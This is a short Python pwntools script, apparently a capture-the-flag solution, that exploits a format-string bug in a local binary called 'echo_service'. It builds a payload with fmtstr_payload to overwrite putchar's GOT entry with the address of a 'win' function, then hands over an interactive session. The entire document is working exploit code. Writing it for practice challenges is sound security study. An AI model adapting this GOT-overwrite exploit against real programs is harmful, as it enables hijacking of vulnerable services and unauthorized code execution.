from pwn import *

context.binary = elf = ELF('./echo_service', checksec=False)

def main():
    p = process('./echo_service')
     # Target: overwrite putchar@GOT (0x404000) with win (0x401216)
     
        # Stack offset for local_98 buffer is 6
    payload = fmtstr_payload(6, {elf.got['putchar']: elf.sym['win']})
    p.sendlineafter(b'> ', payload)
    p.interactive()

if __name__ == '__main__':
    main()
